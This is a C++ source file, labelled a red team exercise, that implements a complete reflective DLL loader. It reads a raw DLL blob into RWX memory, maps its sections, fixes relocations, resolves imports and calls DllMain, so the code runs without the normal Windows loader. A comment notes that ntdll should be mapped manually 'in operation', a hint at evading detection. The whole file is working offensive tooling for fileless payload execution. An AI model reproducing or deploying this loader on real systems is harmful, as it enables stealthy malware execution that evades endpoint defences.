// reflective_loader.cpp — User-Defined Reflective Loader (Red Team Exercise #71)
// Loads a DLL from a raw blob in memory, without mapping the file from disk.
// Usage: loader.exe <dll.bin>   (the DLL must be compiled without ASLR/reloc-strip for the demo)

#include <windows.h>
#include <cstdint>
#include <cstdio>

typedef BOOL(WINAPI* pDllMain)(HINSTANCE, DWORD, LPVOID);

static bool ReflectiveLoad(const uint8_t* pe)
{
    // 1. Validate PE signatures
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    // 2. Allocate memory for the entire image (RWX to simplify the demo)
    LPVOID mem = VirtualAlloc(nullptr, nt->OptionalHeader.SizeOfImage,
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;

    // 3. Copy headers and sections to the allocated address
    memcpy(mem, pe, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (unsigned i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        memcpy((uint8_t*)mem + sec->VirtualAddress,
               pe + sec->PointerToRawData, sec->SizeOfRawData);
    }

    // 4. Fix base relocations (when the actual address differs from the preferred one)
    uintptr_t delta = (uintptr_t)mem - nt->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY* relDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (delta && relDir->Size) {
        IMAGE_BASE_RELOCATION* blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)mem + relDir->VirtualAddress);
        while (blk->VirtualAddress) {
            uint16_t* ent = (uint16_t*)(blk + 1);
            unsigned n = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
            for (unsigned i = 0; i < n; i++) {
                if ((ent[i] >> 12) == IMAGE_REL_BASED_DIR64)
                    *(uint64_t*)((uint8_t*)mem + blk->VirtualAddress + (ent[i] & 0xFFF)) += delta;
            }
            blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)blk + blk->SizeOfBlock);
        }
    }

    // 5. Resolve imports (demo uses LoadLibraryA; in operation, map ntdll manually)
    IMAGE_DATA_DIRECTORY* impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->Size) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((uint8_t*)mem + impDir->VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE mod = LoadLibraryA((char*)((uint8_t*)mem + imp->Name));
            if (!mod) return false;
            IMAGE_THUNK_DATA* iat  = (IMAGE_THUNK_DATA*)((uint8_t*)mem + imp->FirstThunk);
            IMAGE_THUNK_DATA* orig = (IMAGE_THUNK_DATA*)((uint8_t*)mem + imp->OriginalFirstThunk);
            for (; orig->u1.AddressOfData; orig++, iat++) {
                if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal))
                    iat->u1.Function = (ULONG_PTR)GetProcAddress(mod,
                        MAKEINTRESOURCEA(IMAGE_ORDINAL(orig->u1.Ordinal)));
                else {
                    IMAGE_IMPORT_BY_NAME* ibn =
                        (IMAGE_IMPORT_BY_NAME*)((uint8_t*)mem + orig->u1.AddressOfData);
                    iat->u1.Function = (ULONG_PTR)GetProcAddress(mod, ibn->Name);
                }
            }
        }
    }

    // 6. Call DllMain (DLL entry point)
    pDllMain entry = (pDllMain)((uint8_t*)mem + nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)mem, DLL_PROCESS_ATTACH, nullptr);
    printf("[+] DLL reflectively loaded at %p\n", mem);
    return true;
}

int main(int argc, char** argv)
{
    if (argc < 2) { printf("[-] usage: loader.exe <dll.bin>\n"); return 1; }

    // Reads the DLL as an opaque blob — the loader never knows it's a PE on disk
    FILE* f = fopen(argv[1], "rb");
    if (!f) { printf("[-] could not open %s\n", argv[1]); return 1; }
    fseek(f, 0, SEEK_END); size_t sz = (size_t)ftell(f); fseek(f, 0, SEEK_SET);
    uint8_t* buf = new uint8_t[sz];
    fread(buf, 1, sz, f); fclose(f);

    return ReflectiveLoad(buf) ? 0 : 1;
}
